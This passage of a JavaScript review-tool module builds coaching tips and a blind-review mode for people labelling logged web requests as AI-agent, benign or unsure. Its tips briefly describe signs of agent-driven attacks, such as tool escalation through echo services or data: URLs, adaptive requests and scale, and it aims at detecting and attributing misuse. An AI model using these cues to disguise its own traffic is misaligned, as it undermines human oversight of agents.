      add("info", "Only context hits (relays, cache busters, vendor names, headers, outcomes). Ordinary clients produce these, and together they stay noise. Usually benign.", ["FM-4.11"]);
    }

    // What the evidence is, from weakest up.
    if (payload && !residue && !has("carrier") && (level == null || level <= 1)) {
      const what = has("exploit") && channel ? "payloads and a callback channel" : has("exploit") ? "payloads" : "a callback channel";
      add("warn", `The evidence is ${what}. That shows what was sent, not who sent it: a tester or scanner leaves the same records. Without a model's hand or machine behaviour, unsure is the honest label; benign if it shows a person or a tool.`, ["FM-14.7"]);
    }
    if ((has("self_id") || tag) && !residue && !has("carrier") && (level == null || level <= 1)) {
      add("warn", tag
        ? "The agent evidence here is a run or test tag. Like a vendor name it is self-description: anyone can type it, and tags quoted in reports get copied."
        : "The only agent evidence is a vendor or model name, the weakest there is: anyone can write it, and it never names a developer.",
        tag ? ["FM-14.1", "FM-14.5"] : ["FM-14.1"]);
    }
    if (has("carrier")) {
      add("info", "A program carried through an echo service or data: URL is tool escalation, which agents use and few people need. Its shape alone is not a model's hand: below L2 the label is unsure, with a note. Count the program's rules once, and label who sent it, not whether the task was harmful.", ["FM-14.22", "FM-14.21"]);
    }
    if (residue && (level == null || level <= 2)) {
      add("warn", "Model-written, with no behaviour shown: residue means a model wrote the request, and a person pasting chatbot output leaves the same." +
        (capture ? " Every time here is an archive capture, so pace and retries cannot be read at all."
          : level == null ? " One unclustered record shows no retries or pace; unsure unless something else points one way."
            : " Look for retries, pace or scale before agent."),
        capture ? ["FM-14.8", "FM-14.4"] : ["FM-14.8"]);
    }
    if (kinds.size && strong.length && (level == null || level <= 1)) {
      add("warn", level == null
        ? "No agent grade. Unsure is the most this supports."
        : `Grade ${grade.code}: agent needs L2 or higher, so unsure is the most this group supports.`, ["FM-7.10"]);
    }
    if (level === 3) {
      add("info", "Adaptive: requests change in answer to responses. A person in a proxy repeater does this too, so weigh pace and the counter-signals before agent.", ["FM-7.10"]);
    } else if (level != null && level >= 4) {
      add(grade.counter.length ? "info" : "strong", "Agent likely: adaptation or scale beyond one person." +
        (grade.counter.length ? " Weigh the counter-signals before agent." : " With no counter-signal, this is the strongest evidence the page computes."), ["FM-7.10"]);
    }
    if (grade && grade.counter.length) {
      add("info", "Counter-signals: " + grade.counter.map((c) => c.label).join("; ") + ". They never move the grade, and declared testing is self-identification too.", ["FM-4.9"]);
    }
    if (!g.cluster && g.items.length > 1) {
      add("info", "Grouped by shape, not linked: these records may come from different senders. Label a record on its own row if it differs.", []);
    } else if (g.cluster && g.cluster.size >= 25) {
      add("info", `A large cluster (${g.cluster.size} members). One common feature can merge unrelated clients; spot-check records from both ends before labelling them all.`, ["FM-14.6"]);
    }

    const s = Review.suggestionOf(g);
    if (s) {
      const split = Object.keys(s.by).length > 1;
      if (split) {
        add("sug", "The suggestions are split (" + Object.entries(s.by).map(([l, n]) => `${n} ${l}`).join(", ") + "): the records may differ. Check them one by one.", []);
      } else if (s.label === "agent" && (level == null || level <= 1)) {
        add("sug", `The suggestion says agent, but nothing ${grade ? "above " + grade.code : "beyond the rules' hits"} backs it. Models often read payloads or names as agent evidence; check its reason.`, ["FM-14.7"]);
      } else if (s.label === "benign" && level != null && level >= 3 && !grade.counter.length) {
        add("sug", `The suggestion says benign against an ${grade.code} grade with no counter-signal. Check its reason against the signals.`, []);
      }
    }
    return out;
  }

  function coach(g) {
    // Blind review: reveal this group's suggestions once every record has a label.
    document.body.classList.toggle("gd-reveal", g.items.every((i) => i.label));
    const list = tips(g);
    if (!list.length) return null;
    const open = store.get("coach-open", true);
    const hidden = blind && !g.items.every((i) => i.label);
    const shown = list.filter((t) => !(hidden && t.tone === "sug")).length;
    const details = el("details.gd-coach-box", {
      open,
      ontoggle: (e) => store.set("coach-open", e.target.open),
    },
      el("summary",
        el("span.gd-coach-title", "How to decide this group"),
        el("span.gd-coach-n", `${shown} ${shown === 1 ? "note" : "notes"}`),
        el("span.gd-coach-guide", "guide ", el("kbd", "G"))),
      el("ul.gd-tips", list.map((t) => el("li.gd-tip." + t.tone + (t.tone === "sug" ? ".suggestion-ui" : ""),
        el("span.gd-tip-mark"), el("span", t.text, " ", cites(t.refs))))));
    return el("section.card.gd-coach", details);
  }

  // ---- blind review --------------------------------------------------------

  let blind = !!store.get("blind", false);
  function applyBlind() { document.body.classList.toggle("gd-blind", blind); }
  function toggleBlind() {
    blind = !blind;
    store.set("blind", blind);
    applyBlind();
    toast(blind ? "Blind review: suggestions stay hidden until you label a group" : "Suggestions shown");
    Review.render();
  }

  // Escape closes the welcome through the shared handler; it still counts as seen.
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && document.querySelector(".gd-welcome-overlay")) store.set("welcomed", true);
  }, true);

  // `s` accepts suggestions you cannot see; in blind review it waits for a label.
  document.addEventListener("keydown", (e) => {
    if (!blind || e.key !== "s" || e.ctrlKey || e.metaKey || e.altKey) return;
    if (e.target.matches("input, textarea, select") || document.querySelector(".overlay")) return;
    const g = Review.current();
    if (g && !g.items.every((i) => i.label)) {
      e.stopImmediatePropagation();
      e.preventDefault();
      toast("Blind review: label the group first, then compare with the suggestion");
    }
  }, true);

  // Keys inside the drawer: the shared handler ignores keys while an overlay is up.
  document.addEventListener("keydown", (e) => {
    if (e.defaultPrevented || !isOpen() || e.ctrlKey || e.metaKey || e.altKey) return;
    if (e.target.matches("input, textarea, select")) return;
    if (e.key === "g") { closeGuide(); e.preventDefault(); return; }
    if (tab !== "practice") return;
    const k = e.key.toLowerCase();
    const l = LABELS.find((x) => x.label[0] === k);
    if (l) { answer(l.label); e.preventDefault(); } else if (e.key === "Enter" || e.key === "ArrowRight") {
      if (practice.i >= PRACTICE.length) return;
      next(); e.preventDefault();
    }
  });

  // ---- registration ----------------------------------------------------------

  Review.topbarItems.push(() => el("div.gd-top",
    el("button.btn.ghost.small.gd-guide-btn", { onclick: () => openGuide(), title: "Evaluator guide (G)" }, "Guide", el("kbd", "G")),
    el("button.btn.ghost.small.gd-blind-btn" + (blind ? ".on" : ""), {
      onclick: toggleBlind, "aria-pressed": String(blind),
      title: "Blind review: hide model suggestions until you label a group (H)",
    }, el("span.gd-switch"), "Blind", el("kbd", "H"))));
  Review.panels.push(coach);
  Review.onLoad.push(() => {
    applyBlind();
    if (!store.get("welcomed", false)) setTimeout(welcome, 0);
  });
  keys([
    { keys: ["g"], label: "open the evaluator guide", run: () => openGuide() },
    { keys: ["h"], label: "blind review: hide suggestions until labelled", run: toggleBlind },
  ]);
})();
